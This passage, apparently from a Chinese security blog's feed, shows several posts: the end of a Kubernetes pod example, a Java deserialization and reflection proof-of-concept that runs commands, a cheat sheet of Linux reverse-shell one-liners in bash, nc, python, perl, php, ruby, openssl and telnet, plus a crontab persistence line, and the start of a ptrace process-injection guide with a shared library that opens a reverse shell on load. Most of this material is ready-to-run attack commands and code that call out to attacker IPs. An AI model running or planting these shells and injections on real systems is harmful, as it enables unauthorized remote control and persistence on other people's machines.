<p>kubectl apply -f nginx.yaml</p>
<p>kubectl get pods</p>
<p>结果：</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">[root@<span class="keyword">master</span> <span class="title">~]# kubectl</span> get pods</span><br><span class="line">NAME         READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-demo   <span class="number">1</span>/<span class="number">1</span>     Running   <span class="number">0</span>          <span class="number">7s</span></span><br></pre></td></tr></table></figure>

<p>进入Pod:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">kubectl exec -it nginx-demo <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>Kubernetes</tag>
      </tags>
  </entry>
  <entry>
    <title>java漏洞POC编写</title>
    <url>/java%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<blockquote>
<p>曲径通幽处，禅房花木深。</p>
</blockquote>
<p>java poc编写入门。</p>
<p>本文从最简单的使用Runtime执行命令，再通过反射执行命令，之后又在反序列场景执行命令，最后是反序列化和反射结合执行命令。</p>
<span id="more"></span>



<h2 id="1-最简单的执行命令"><a href="#1-最简单的执行命令" class="headerlink" title="1. 最简单的执行命令"></a>1. 最简单的执行命令</h2><p>目标：首先明确我们的最终目的是为了执行语句<code>Runtime.getRuntime().exec(&quot;open -a calculator&quot;);</code></p>
<ul>
<li>Runtime.getRuntime：获取一个Runtime的实例</li>
<li>exec()：调用实例的exec函数</li>
<li>“open -a calculator”: 执行的参数</li>
</ul>
<p>最简单的弹计算器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExecRuntimeDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="2-反射改造"><a href="#2-反射改造" class="headerlink" title="2. 反射改造"></a>2. 反射改造</h2><p>因为最后是通过反射机制来进行漏洞利用的，</p>
<p>所以先进行反射改造</p>
<p>最简单的反射构造应该是如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1. 获取Runtime的Class对象</span></span><br><span class="line">        Class runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//2. 通过Class对象调用exec方法</span></span><br><span class="line">        Method execMethod = runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">//Runtime runtime = new Runtime(); 不可以，Runtime类是单例模式。每个 Java 应用程序都有一个 </span></span><br><span class="line">       	<span class="comment">//Runtime类实例,通过getRuntime方法获取当前Runtime运行时对象的引用。</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//3. 创建一个Runtime对象</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//4. 在方法对象中传入对象和参数执行方法</span></span><br><span class="line">        execMethod.invoke(runtime, <span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="3-序列化与反序列化"><a href="#3-序列化与反序列化" class="headerlink" title="3. 序列化与反序列化"></a>3. 序列化与反序列化</h2><p>编写一个存在漏洞的重写了readObject的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> serializable.Serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>客户端构造一个恶意类，传给服务端，服务端在反序列化时调用了重写的readObject方法，导致命令被执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeSerializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//客户端写入文件</span></span><br><span class="line">        VulnClass vulnClass = <span class="keyword">new</span> VulnClass();</span><br><span class="line">        vulnClass.cmd = <span class="string">&quot;open -a calculator&quot;</span>;</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(vulnClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">        VulnClass vulnClass1 = (VulnClass) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>









<h2 id="4-反序列化反射改造1"><a href="#4-反序列化反射改造1" class="headerlink" title="4. 反序列化反射改造1"></a>4. 反序列化反射改造1</h2><ol>
<li><p>客户端将payload序列化，传给服务端</p>
</li>
<li><p>服务端将其反序列化，通过反射执行payload</p>
</li>
</ol>
<p>需要说明的是，这里不是完全反射，需要在服务端传入Runtime类。</p>
<p>重写了readObject的漏洞程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnClass</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">vulnInvoke</span><span class="params">(Object input)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>反序列化后通过反射执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RuntimeSerializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//客户端写入文件</span></span><br><span class="line">        VulnClass vulnClass = <span class="keyword">new</span> VulnClass(</span><br><span class="line">                <span class="string">&quot;Runtime.class&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">        );</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(vulnClass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fileInputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">        VulnClass vulnClass1 = (VulnClass) objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        vulnClass1.vulnInvoke(runtime);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="5-反序列化反射改造2"><a href="#5-反序列化反射改造2" class="headerlink" title="5. 反序列化反射改造2"></a>5. 反序列化反射改造2</h2><p>我们要进行完全反射的话，不能在服务端创建Runtime对象，那么我们需要反射出服务端的Runtime实例对象。</p>
<p>反射实例对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>那么完整payload就如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        Method runtimeMethod = runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        runtimeMethod.invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里需要知道getMethod(“getRuntime”)是因为java.lang.Runtime是单例模式，只能通过getRuntime方法获取对象。</p>
<p>将上诉poc改成一句就为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> POCDemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),<span class="string">&quot;open -a calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p>本文从最简单的使用Runtime执行命令，再通过反射执行命令，之后又在反序列场景执行命令，最后是反序列化和反射结合执行命令。</p>
]]></content>
      <categories>
        <category>java安全</category>
      </categories>
      <tags>
        <tag>java漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下反弹shell</title>
    <url>/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<blockquote>
<p>桃李春风一杯酒，江湖夜雨十年灯。</p>
</blockquote>
<p>常见的一些linux反弹shell总结</p>
<span id="more"></span>

<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/172.16.42.1/</span><span class="number">44044</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">非bash环境：<span class="regexp">/bin/</span>bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.1/44044 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="zsh反弹"><a href="#zsh反弹" class="headerlink" title="zsh反弹"></a>zsh反弹</h2><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">靶机：zsh -c <span class="string">&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 172.16.42.1 44044 &amp;&amp; zsh &gt;&amp;<span class="subst">$REPLY</span> 2&gt;&amp;<span class="subst">$REPLY</span> 0&gt;&amp;<span class="subst">$REPLY</span>&#x27;</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>





<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2> <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">44044</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="nc正向反弹"><a href="#nc正向反弹" class="headerlink" title="nc正向反弹"></a>nc正向反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：nc -lvp <span class="number">7777</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc <span class="number">172.16</span>.<span class="number">43.1</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>



<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">靶机: mknod <span class="keyword">a</span> p; telnet <span class="number">172.16</span><span class="number">.42</span><span class="number">.1</span> <span class="number">44044</span> <span class="number">0</span>&lt;<span class="keyword">a</span> | /bin/bash <span class="number">1</span>&gt;<span class="keyword">a</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">python -c &#x27;import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">&quot;172.16.42.1&quot;</span>,<span class="number">44044</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;172.16.42.1&quot;</span>;<span class="variable">$p</span>=<span class="number">44044</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="open-ssh-反弹"><a href="#open-ssh-反弹" class="headerlink" title="open ssh 反弹"></a>open ssh 反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">172.16</span>.<span class="number">42.150</span>:<span class="number">2333</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">openssl req -x509 -newkey rsa:<span class="number">2048</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="number">2333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="SSH反弹"><a href="#SSH反弹" class="headerlink" title="SSH反弹"></a>SSH反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp/su -oPort=<span class="number">8080</span>;</span><br><span class="line">攻击机：</span><br><span class="line">ssh root@<span class="number">172.16</span>.<span class="number">42.146</span> -p <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.146<span class="subst">\&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="number">8080</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="string">&quot;8080&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br><span class="line"><span class="pattern-match">攻击机：</span></span><br><span class="line"><span class="pattern-match">nc -lvvp 8080</span></span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://jkme.github.io/pages/reverse-shell.html">https://jkme.github.io/pages/reverse-shell.html</a></p>
<p><a href="https://ninjia.gitbook.io/secskill/net/shell#php">https://ninjia.gitbook.io/secskill/net/shell#php</a></p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
        <tag>linux安全</tag>
      </tags>
  </entry>
  <entry>
    <title>linux进程注入</title>
    <url>/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<blockquote>
<p>持而盈之，不如其已。揣而锐之，不可长保。</p>
</blockquote>
<p>通过linux进程注入我们可以进行隐藏我们的攻击，维持我们的权限，某些场景下也可以进行容器逃逸。</p>
<span id="more"></span>

<h2 id="1-使用动态链接库进行进程注入"><a href="#1-使用动态链接库进行进程注入" class="headerlink" title="1. 使用动态链接库进行进程注入"></a>1. 使用动态链接库进行进程注入</h2><h3 id="1-1-动态链接注入"><a href="#1-1-动态链接注入" class="headerlink" title="1.1 动态链接注入"></a>1.1 动态链接注入</h3><p>通过进程注入技术，能够使得动态链接库被加载到一个正在运行的进程，因此较为隐蔽。进程注入通过调用<code>ptrace()</code>实现了与Windows平台下相同作用的API 函数<code>CreateRemoteThread()</code>。</p>
<p>linux的/proc/sys/kernel/yama/ptrace_scope限制了一个进程除了<code>fork()</code>派生外，无法通过<code>ptrace()</code>来操作另外一个进程。我们可以通过<code>echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</code>来修改，但是一般linux版本默认就是为0。</p>
<p>使用别已经造好的进程注入轮子：<a href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p>
<h3 id="1-2-进程注入工具安装"><a href="#1-2-进程注入工具安装" class="headerlink" title="1.2 进程注入工具安装"></a>1.2 进程注入工具安装</h3><p><strong>1. 下载：</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/gaffe23/</span>linux-inject.git</span><br></pre></td></tr></table></figure>

<p><strong>2. 编译：</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> linux-inject</span><br><span class="line"><span class="attribute">make</span> x<span class="number">86</span>_<span class="number">64</span></span><br></pre></td></tr></table></figure>

<p>如果报错类似如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/include/stdio.h:27:10: fatal error: <span class="string">&#x27;bits/libc-header-start.h&#x27;</span> file not found</span><br></pre></td></tr></table></figure>

<p>执行<code>apt install gcc-multilib</code>即可。</p>
<p><strong>3. 测试是否编译成功：</strong></p>
<ul>
<li><p>启动sample-target</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./sample-target</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br></pre></td></tr></table></figure></li>
<li><p>查看sample-target的进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ps -ef | grep sample-target | grep -v grep</span><br><span class="line">root      15771  15710  0 20:12 pts/3    00:00:00 ./sample-targe</span><br></pre></td></tr></table></figure>

<p>进程为15771</p>
</li>
<li><p>尝试注入进程</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./inject -p 15771 ./sample-library.so</span><br><span class="line">targeting process with pid 15771</span><br><span class="line">could not inject <span class="string">&quot;./sample-library.so&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p>进程注入成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  linux-inject git:(master) ./sample-target</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">sleeping...</span><br><span class="line">......</span><br><span class="line">I just got loaded</span><br></pre></td></tr></table></figure>

<p>注入成功会有”I just got loaded“的提示</p>
</li>
</ul>
<h3 id="1-3-编写一个简单的poc"><a href="#1-3-编写一个简单的poc" class="headerlink" title="1.3 编写一个简单的poc"></a>1.3 编写一个简单的poc</h3><p>我们重写so文件，进行反弹shell。</p>
<p>poc1.c:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;I just got loaded\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/172.16.42.100/4444 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__attribute__((constructor))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loadMsg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   shell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们用clang进行编译，编译前先安装<code>apt install clang</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clang -std=gnu99 -ggdb -D_GNU_SOURCE -shared -o poc1.so -lpthread -fPIC poc1.c</span><br></pre></td></tr></table></figure>

<p>我们启动一个python进程用来注入</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">python3</span> -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p>在攻击机上启动监听：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>

<p>注入：</p>
